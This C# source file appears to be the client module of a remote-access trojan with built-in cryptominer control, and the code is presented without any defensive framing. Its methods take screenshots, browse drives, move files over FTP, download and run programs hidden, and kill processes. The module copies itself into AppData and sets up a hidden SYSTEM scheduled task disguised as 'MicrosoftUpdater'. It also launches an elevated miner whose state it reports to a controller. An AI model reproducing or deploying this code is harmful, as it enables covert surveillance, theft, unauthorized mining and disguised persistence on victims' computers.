﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Interfaces;
using Interfaces.Users;

namespace ClientWorker
{
	public class Functions : IUser
	{
        Process M;
        public void UploadDirectory(string dirPath, string uploadPath)
        {
            FileManager.UploadDirectory(dirPath, uploadPath);
        }
        public IDirectoryInfo GetDirectoryFiles(string path,string searchPattern)
        {
            IDirectoryInfo directoryInfo = new IDirectoryInfo();
            foreach (string s in Directory.GetDirectories(path, searchPattern))
                directoryInfo.Directories.Add(s);
            foreach (string s in Directory.GetFiles(path, searchPattern))
            {

                FileInfo fInfo = new FileInfo(s);
                directoryInfo.FilesInfo.Add(new IFileInfo(fInfo));
            }

            return directoryInfo;
        }
        public List<string> GetDrives()
        {
            List<string> result = new List<string>();
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in allDrives)
            {
                result.Add(drive.ToString());
            }
            return result;
        }
        public string GetKey()
        {
            return Service.Properties.Settings.Default.Key;
        }
        public List<string> GetListProc()
        {
            List<string> result = new List<string>();
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    result.Add(process.ProcessName);
                }
                catch (Exception ex)
                {
                    Log.Send(ex.Message);
                }
            }

            return result;
        }
        public List<string> GetLog()
        {
            return SendLogList();
        }
        public IInfoDevice GetInfoDevice()
        {
            InfoDevice infoDevice = new InfoDevice();
            IInfoDevice t = new IInfoDevice();
            t = infoDevice.AskedInfoDevice();
            return t;
        }
        public Bitmap ScreenShot()
        {
            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics GH = Graphics.FromImage(BM as Image);
            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
            return BM;
        }
        public void DownloadFloader(string ftpPath, string localPath)
        {
            FileManager.DownloadFloader(ftpPath, localPath);
        }
        public void DownloadF(string FileName, string localPath)
        {
            if (FtpClient.FtpDirectoryExists(FileName))
            {
                FileManager.DownloadFloader(FileName, localPath);
            }
            else
            {
                FtpClient.DownloadF(FileName, localPath);
            }           
        }
        public void DownloadUpdate()
        {
            GetUpd();
        }
        public void RunHideProgram(string file)
        {
            FileManager.RunHideProc(file);
        }
        public void DownloadAndRun(string file)
        {
            FileManager.DownloadFileAndRun(file);
        }
        public void Reconnect()
        {
            Program.netSender.ReConnect();
            //throw new Exception("Не реализовано");
        }
        public void DeleteFile(string file)
        {
            FileManager.DeleteFile(file);
        }
        public void KillProcess(string procName)
        {
            foreach (Process process in Process.GetProcessesByName(procName))
            {
                process.Kill();
            }
        }
        public ISetting GetSetting()
        {
            ISetting setting = new ISetting
            {
                Comp_name = Service.Properties.Settings.Default.Comp_name,
                IsMiner = Service.Properties.Settings.Default.IsMiner,
                Open_sum = Service.Properties.Settings.Default.Open_sum,
                Start_time = Service.Properties.Settings.Default.Start_time,
                Key = Service.Properties.Settings.Default.Key,
                Version = Service.Properties.Settings.Default.Version
            };

            return setting;
        }
        public void GetUpd()
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                KillUpdater();
                FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
                FileManager.RunHideProc(folderPath + StartData.floaderNewCopy + StartData.updater);              
        }
        private void KillUpdater()
        {
            try
            {
                foreach (Process process in Process.GetProcessesByName("Updater"))
                {
                    process.Kill();
                }

                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                folderPath += StartData.floaderNewCopy;

                File.Delete(folderPath + StartData.updater);
            }
            catch (Exception ex)
            {
                Log.Send("Не удалось удалить Updater: "+ex.Message);
            }
        }
        private List<string> SendLogList()
        {
            List<string> message = new List<string>();
            foreach (string s in Log.messages)
            {
                message.Add(s);
            }
            return message;
        }
        public static void Registration()
        {
            Log.Send("Registration()");
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            CreateTask(folderPath + StartData.floaderNewCopy);
            Proliferation(folderPath);
        }
        public static void Proliferation(string parth)
        {
            Log.Send("Proliferation()");
            parth += StartData.floaderNewCopy;
            string executablePath = Application.ExecutablePath;
            try
            {
                if (!File.Exists(parth + StartData.service))
                {
                    DirectoryInfo directoryInfo = Directory.CreateDirectory(parth);
                    File.Copy(executablePath, parth + StartData.service);
                }
            }
            catch (Exception ex)
            {
                Log.Send("Ошибка копирования :" + ex.Message);
            }
        }
        public static void CreateTask(string fileParth)
        {
            new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Verb = "runas",
                    Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR " + fileParth + StartData.service,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            }.Start();
            Log.Send("Задача создана");
        }
        public void Disconnect()
        {
            Environment.Exit(0);
        }

        public void RunM(string file,string args)
        {

            M = new Process
            {
                StartInfo =
                {
                    FileName = file,
                    Verb = "runas",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            };
            M.EnableRaisingEvents = true;
            M.Exited += new EventHandler(MExited);
            M.Start();


            StartData.isWorkingM = true;
            Unit MUint = new Unit("ChangeStateMiner", new object[] { StartData.isWorkingM });
            Program.netSender.SendData(MUint);
        }

        private void MExited(object sender, System.EventArgs e)
        {
            StartData.isWorkingM = false;
            Unit MUint = new Unit("ChangeStateMiner", new object[] { StartData.isWorkingM });
            Program.netSender.SendData(MUint);
        }

        public void SetCompName(string newName)
        {
            Service.Properties.Settings.Default.Comp_name = newName;
            Service.Properties.Settings.Default.Save();
        }
    }
}
